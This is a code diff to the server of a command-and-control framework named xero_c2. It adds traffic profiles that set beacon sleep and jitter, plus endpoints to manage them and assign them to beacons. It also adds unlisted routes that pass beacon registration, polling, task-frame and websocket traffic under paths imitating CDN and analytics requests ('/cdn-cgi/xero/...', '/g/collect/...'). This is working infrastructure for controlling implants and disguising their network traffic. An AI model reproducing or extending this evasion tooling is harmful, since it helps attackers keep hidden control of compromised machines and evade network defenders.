@@ -81,6 +81,8 @@ from xero_c2.models import (
     TaskAuditEvent,
     TaskResult,
     TaskResultArtifact,
+    TrafficProfile,
+    TrafficProfileVersion,
 )
 from xero_c2.protocol import (
     ACK,
@@ -155,6 +157,15 @@ from xero_c2.schemas import (
     TaskResultListResponse,
     TaskResultResponse,
     TaskStatus,
+    TrafficProfileAssignRequest,
+    TrafficProfileCloneRequest,
+    TrafficProfileCreateRequest,
+    TrafficProfileListResponse,
+    TrafficProfileResponse,
+    TrafficProfileRollbackRequest,
+    TrafficProfileUpdateRequest,
+    TrafficProfileVersionListResponse,
+    TrafficProfileVersionResponse,
     TransportStatusResponse,
     WorkerHeartbeatRequest,
     WorkerHeartbeatResponse,
@@ -207,6 +218,18 @@ from xero_c2.task_results import (
     purge_expired_task_results,
     run_task_result_retention_monitor,
 )
+from xero_c2.traffic_profiles import (
+    assign_profile_to_beacon,
+    clone_profile,
+    create_profile,
+    ensure_template_profiles,
+    find_profile,
+    profile_ack_fields,
+    public_traffic_profile,
+    public_traffic_profile_version,
+    rollback_profile,
+    update_profile,
+)
 
 
 def get_db_session():
@@ -230,6 +253,7 @@ def liveness_payload() -> dict[str, str]:
 
 
 def public_beacon(beacon: Beacon) -> dict:
+    profile = beacon.profile
     return {
         "id": str(beacon.id),
         "machine_fingerprint_hash": beacon.machine_fingerprint_hash,
@@ -240,6 +264,14 @@ def public_beacon(beacon: Beacon) -> dict:
         "external_ip": beacon.external_ip,
         "pid": beacon.pid,
         "status": beacon.status,
+        "profile_id": str(beacon.profile_id) if beacon.profile_id else None,
+        "profile_name": profile.name if profile else None,
+        "profile_template": profile.template if profile else None,
+        "profile_version": profile.current_version if profile else None,
+        "applied_profile_version": beacon.applied_profile_version,
+        "profile_applied_at": beacon.profile_applied_at.isoformat() if beacon.profile_applied_at else None,
+        "sleep_seconds": beacon.sleep_seconds,
+        "jitter": beacon.jitter,
         "protocol_version": beacon.protocol_version,
         "transport_mode": beacon.transport_mode,
         "transport_connected": beacon.transport_connected,
@@ -421,7 +453,8 @@ async def build_next_longpoll_task_frame(app: FastAPI, settings, beacon_id: uuid
         if task is None:
             return None
         try:
-            frame = encode_task_ack_frame(settings, beacon, task, transport="long-poll")
+            profile_fields = profile_ack_fields(session, settings, beacon)
+            frame = encode_task_ack_frame(settings, beacon, task, profile_fields=profile_fields, transport="long-poll")
         except ProtocolError:
             await requeue_dispatched_task(
                 session,
@@ -494,6 +527,7 @@ def create_app() -> FastAPI:
         SessionFactory = session_factory_for_settings(settings)
         with SessionFactory() as session:
             ensure_embedded_workers(session, settings)
+            ensure_template_profiles(session)
             reset_beacon_transport_connections(session)
             purge_expired_task_results(session, settings)
             expire_idle_sessions(session, settings)
@@ -585,6 +619,14 @@ def create_app() -> FastAPI:
     async def beacon_websocket(websocket: WebSocket) -> None:
         await run_beacon_websocket(websocket, settings=settings, public_beacon=public_beacon)
 
+    @app.websocket("/cdn-cgi/xero/ws")
+    async def cloudfront_beacon_websocket(websocket: WebSocket) -> None:
+        await run_beacon_websocket(websocket, settings=settings, public_beacon=public_beacon)
+
+    @app.websocket("/g/collect/ws")
+    async def analytics_beacon_websocket(websocket: WebSocket) -> None:
+        await run_beacon_websocket(websocket, settings=settings, public_beacon=public_beacon)
+
     @app.websocket("/ws/sessions/{session_id}")
     async def shell_session_websocket(websocket: WebSocket, session_id: uuid.UUID) -> None:
         if not websocket_origin_allowed(websocket, settings):
@@ -669,6 +711,191 @@ def create_app() -> FastAPI:
         return ProtocolSecurityEventListResponse(
             items=[ProtocolSecurityEventResponse(**public_protocol_security_event(event)) for event in events]
         )
+
+    @api_router.get("/traffic-profiles", response_model=TrafficProfileListResponse, tags=["traffic-profiles"])
+    def list_traffic_profiles(
+        session: DbSession,
+        authorization: Annotated[str | None, Header()] = None,
+        include_archived: bool = False,
+    ) -> TrafficProfileListResponse:
+        authorize_c2_token(settings, authorization)
+        ensure_template_profiles(session)
+        session.commit()
+        query = select(TrafficProfile).order_by(TrafficProfile.is_template.desc(), TrafficProfile.name.asc())
+        if not include_archived:
+            query = query.where(TrafficProfile.is_archived.is_(False))
+        profiles = session.execute(query).scalars()
+        return TrafficProfileListResponse(
+            items=[TrafficProfileResponse(**public_traffic_profile(session, profile)) for profile in profiles]
+        )
+
+    @api_router.post("/traffic-profiles", response_model=TrafficProfileResponse, tags=["traffic-profiles"])
+    def create_traffic_profile(
+        payload: TrafficProfileCreateRequest,
+        session: DbSession,
+        authorization: Annotated[str | None, Header()] = None,
+    ) -> TrafficProfileResponse:
+        claims = authorize_c2_token(settings, authorization)
+        try:
+            profile = create_profile(
+                session,
+                actor_subject=actor_subject_from_claims(claims),
+                config=payload.config,
+                description=payload.description,
+                name=payload.name,
+                template=payload.template,
+            )
+            session.commit()
+            session.refresh(profile)
+        except ValueError as exc:
+            session.rollback()
+            raise HTTPException(status_code=status.HTTP_422_UNPROCESSABLE_ENTITY, detail=str(exc)) from exc
+        return TrafficProfileResponse(**public_traffic_profile(session, profile))
+
+    @api_router.get("/traffic-profiles/{profile_id}", response_model=TrafficProfileResponse, tags=["traffic-profiles"])
+    def get_traffic_profile(
+        profile_id: uuid.UUID,
+        session: DbSession,
+        authorization: Annotated[str | None, Header()] = None,
+    ) -> TrafficProfileResponse:
+        authorize_c2_token(settings, authorization)
+        profile = session.get(TrafficProfile, profile_id)
+        if profile is None:
+            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Traffic profile not found")
+        return TrafficProfileResponse(**public_traffic_profile(session, profile))
+
+    @api_router.patch("/traffic-profiles/{profile_id}", response_model=TrafficProfileResponse, tags=["traffic-profiles"])
+    def update_traffic_profile(
+        profile_id: uuid.UUID,
+        payload: TrafficProfileUpdateRequest,
+        session: DbSession,
+        authorization: Annotated[str | None, Header()] = None,
+    ) -> TrafficProfileResponse:
+        claims = authorize_c2_token(settings, authorization)
+        profile = session.get(TrafficProfile, profile_id)
+        if profile is None:
+            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Traffic profile not found")
+        try:
+            updated = update_profile(
+                session,
+                profile,
+                actor_subject=actor_subject_from_claims(claims),
+                config=payload.config,
+                description=payload.description,
+                name=payload.name,
+            )
+            session.commit()
+            session.refresh(updated)
+        except ValueError as exc:
+            session.rollback()
+            raise HTTPException(status_code=status.HTTP_422_UNPROCESSABLE_ENTITY, detail=str(exc)) from exc
+        return TrafficProfileResponse(**public_traffic_profile(session, updated))
+
+    @api_router.delete(
+        "/traffic-profiles/{profile_id}",
+        response_model=TrafficProfileResponse,
+        tags=["traffic-profiles"],
+    )
+    def archive_traffic_profile(
+        profile_id: uuid.UUID,
+        session: DbSession,
+        authorization: Annotated[str | None, Header()] = None,
+    ) -> TrafficProfileResponse:
+        authorize_c2_token(settings, authorization)
+        profile = session.get(TrafficProfile, profile_id)
+        if profile is None:
+            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Traffic profile not found")
+        if profile.is_template:
+            raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail="Template profiles cannot be archived")
+        assigned = session.execute(select(Beacon).where(Beacon.profile_id == profile.id)).first()
+        if assigned is not None:
+            raise HTTPException(status_code=status.HTTP_409_CONFLICT, detail="Traffic profile is assigned to a beacon")
+        profile.is_archived = True
+        session.add(profile)
+        session.commit()
+        session.refresh(profile)
+        return TrafficProfileResponse(**public_traffic_profile(session, profile))
+
+    @api_router.post(
+        "/traffic-profiles/{profile_id}/clone",
+        response_model=TrafficProfileResponse,
+        tags=["traffic-profiles"],
+    )
+    def clone_traffic_profile(
+        profile_id: uuid.UUID,
+        payload: TrafficProfileCloneRequest,
+        session: DbSession,
+        authorization: Annotated[str | None, Header()] = None,
+    ) -> TrafficProfileResponse:
+        claims = authorize_c2_token(settings, authorization)
+        source = session.get(TrafficProfile, profile_id)
+        if source is None:
+            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Traffic profile not found")
+        try:
+            cloned = clone_profile(
+                session,
+                source,
+                actor_subject=actor_subject_from_claims(claims),
+                name=payload.name,
+            )
+            session.commit()
+            session.refresh(cloned)
+        except ValueError as exc:
+            session.rollback()
+            raise HTTPException(status_code=status.HTTP_422_UNPROCESSABLE_ENTITY, detail=str(exc)) from exc
+        return TrafficProfileResponse(**public_traffic_profile(session, cloned))
+
+    @api_router.get(
+        "/traffic-profiles/{profile_id}/versions",
+        response_model=TrafficProfileVersionListResponse,
+        tags=["traffic-profiles"],
+    )
+    def list_traffic_profile_versions(
+        profile_id: uuid.UUID,
+        session: DbSession,
+        authorization: Annotated[str | None, Header()] = None,
+    ) -> TrafficProfileVersionListResponse:
+        authorize_c2_token(settings, authorization)
+        profile = session.get(TrafficProfile, profile_id)
+        if profile is None:
+            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Traffic profile not found")
+        versions = session.execute(
+            select(TrafficProfileVersion)
+            .where(TrafficProfileVersion.profile_id == profile.id)
+            .order_by(TrafficProfileVersion.version.desc())
+        ).scalars()
+        return TrafficProfileVersionListResponse(
+            items=[TrafficProfileVersionResponse(**public_traffic_profile_version(version)) for version in versions]
+        )
+
+    @api_router.post(
+        "/traffic-profiles/{profile_id}/rollback",
+        response_model=TrafficProfileResponse,
+        tags=["traffic-profiles"],
+    )
+    def rollback_traffic_profile(
+        profile_id: uuid.UUID,
+        payload: TrafficProfileRollbackRequest,
+        session: DbSession,
+        authorization: Annotated[str | None, Header()] = None,
+    ) -> TrafficProfileResponse:
+        claims = authorize_c2_token(settings, authorization)
+        profile = session.get(TrafficProfile, profile_id)
+        if profile is None:
+            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Traffic profile not found")
+        try:
+            rolled_back = rollback_profile(
+                session,
+                profile,
+                actor_subject=actor_subject_from_claims(claims),
+                version=payload.version,
+            )
+            session.commit()
+            session.refresh(rolled_back)
+        except ValueError as exc:
+            session.rollback()
+            raise HTTPException(status_code=status.HTTP_422_UNPROCESSABLE_ENTITY, detail=str(exc)) from exc
+        return TrafficProfileResponse(**public_traffic_profile(session, rolled_back))
 
     @api_router.get(
         "/beacon-builds/targets",
@@ -1675,6 +1902,8 @@ def create_app() -> FastAPI:
             )
 
         session.add(beacon)
+        session.flush()
+        profile_fields = profile_ack_fields(session, settings, beacon)
         session.commit()
         session.refresh(beacon)
 
@@ -1693,10 +1922,26 @@ def create_app() -> FastAPI:
             beacon_id=str(beacon.id),
             beacon_token=beacon_token,
             status=beacon.status,
-            sleep=beacon.sleep_seconds,
-            jitter=beacon.jitter,
+            sleep=profile_fields["sleep"],
+            jitter=profile_fields["jitter"],
+            profile=profile_fields["profile"],
             beacon=BeaconResponse(**beacon_payload),
         )
+
+    app.add_api_route(
+        "/cdn-cgi/xero/register",
+        register_beacon,
+        methods=["POST"],
+        response_model=BeaconRegistrationResponse,
+        include_in_schema=False,
+    )
+    app.add_api_route(
+        "/g/collect/register",
+        register_beacon,
+        methods=["POST"],
+        response_model=BeaconRegistrationResponse,
+        include_in_schema=False,
+    )
 
     @api_router.post("/beacons/{beacon_id}/heartbeat", response_model=BeaconHeartbeatResponse, tags=["beacons"])
     async def heartbeat_beacon(
@@ -1730,6 +1975,8 @@ def create_app() -> FastAPI:
             occurred_at=now,
         )
         session.add(beacon)
+        session.flush()
+        profile_fields = profile_ack_fields(session, settings, beacon)
         session.commit()
         session.refresh(beacon)
 
@@ -1739,10 +1986,57 @@ def create_app() -> FastAPI:
         await publish_beacon_event(request.app, settings, "beacon.heartbeat", beacon_payload)
         return BeaconHeartbeatResponse(
             status=beacon.status,
-            sleep=beacon.sleep_seconds,
-            jitter=beacon.jitter,
+            sleep=profile_fields["sleep"],
+            jitter=profile_fields["jitter"],
+            profile=profile_fields["profile"],
             beacon=BeaconResponse(**beacon_payload),
         )
+
+    @api_router.put("/beacons/{beacon_id}/profile", response_model=BeaconResponse, tags=["beacons"])
+    async def assign_beacon_profile(
+        beacon_id: uuid.UUID,
+        payload: TrafficProfileAssignRequest,
+        request: Request,
+        session: DbSession,
+        authorization: Annotated[str | None, Header()] = None,
+    ) -> BeaconResponse:
+        authorize_c2_token(settings, authorization)
+        beacon = session.get(Beacon, beacon_id)
+        if beacon is None:
+            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
+        profile = None
+        if payload.profile_id is not None:
+            profile = find_profile(session, payload.profile_id)
+            if profile is None:
+                raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Traffic profile not found")
+        try:
+            assign_profile_to_beacon(session, beacon, profile)
+            session.commit()
+            session.refresh(beacon)
+        except ValueError as exc:
+            session.rollback()
+            raise HTTPException(status_code=status.HTTP_422_UNPROCESSABLE_ENTITY, detail=str(exc)) from exc
+        beacon_payload = public_beacon(beacon)
+        await publish_beacon_event(request.app, settings, "beacon.profile.changed", beacon_payload)
+        return BeaconResponse(**beacon_payload)
+
+    @api_router.delete("/beacons/{beacon_id}/profile", response_model=BeaconResponse, tags=["beacons"])
+    async def clear_beacon_profile(
+        beacon_id: uuid.UUID,
+        request: Request,
+        session: DbSession,
+        authorization: Annotated[str | None, Header()] = None,
+    ) -> BeaconResponse:
+        authorize_c2_token(settings, authorization)
+        beacon = session.get(Beacon, beacon_id)
+        if beacon is None:
+            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Beacon not found")
+        assign_profile_to_beacon(session, beacon, None)
+        session.commit()
+        session.refresh(beacon)
+        beacon_payload = public_beacon(beacon)
+        await publish_beacon_event(request.app, settings, "beacon.profile.changed", beacon_payload)
+        return BeaconResponse(**beacon_payload)
 
     @api_router.get("/beacons/{beacon_id}/poll", response_model=None, tags=["beacons"])
     async def poll_beacon(
@@ -1783,6 +2077,7 @@ def create_app() -> FastAPI:
                 beacon_payload = public_beacon(beacon) if beacon is not None else None
             if beacon_payload is not None:
                 await publish_beacon_event(request.app, settings, "beacon.transport.changed", beacon_payload)
+
             return Response(content=frame, media_type="application/octet-stream")
 
         configured_timeout = settings.beacon_longpoll_timeout_seconds
@@ -1803,6 +2098,21 @@ def create_app() -> FastAPI:
                     beacon_payload = public_beacon(beacon) if beacon is not None else None
                 if beacon_payload is not None:
                     await publish_beacon_event(request.app, settings, "beacon.transport.changed", beacon_payload)
+
+    app.add_api_route(
+        "/cdn-cgi/xero/{beacon_id}/collect",
+        poll_beacon,
+        methods=["GET"],
+        response_model=None,
+        include_in_schema=False,
+    )
+    app.add_api_route(
+        "/g/collect/{beacon_id}",
+        poll_beacon,
+        methods=["GET"],
+        response_model=None,
+        include_in_schema=False,
+    )
 
     @api_router.post("/beacons/{beacon_id}/frame", response_model=None, tags=["beacons"])
     async def submit_beacon_frame(
@@ -1914,6 +2224,21 @@ def create_app() -> FastAPI:
         except TaskQueueUnavailable:
             session.rollback()
             raise task_queue_unavailable_exception() from None
+
+    app.add_api_route(
+        "/cdn-cgi/xero/{beacon_id}/frame",
+        submit_beacon_frame,
+        methods=["POST"],
+        response_model=None,
+        include_in_schema=False,
+    )
+    app.add_api_route(
+        "/g/collect/{beacon_id}/frame",
+        submit_beacon_frame,
+        methods=["POST"],
+        response_model=None,
+        include_in_schema=False,
+    )
 
     @api_router.get("/beacons", response_model=BeaconListResponse, tags=["beacons"])
     def list_beacons(
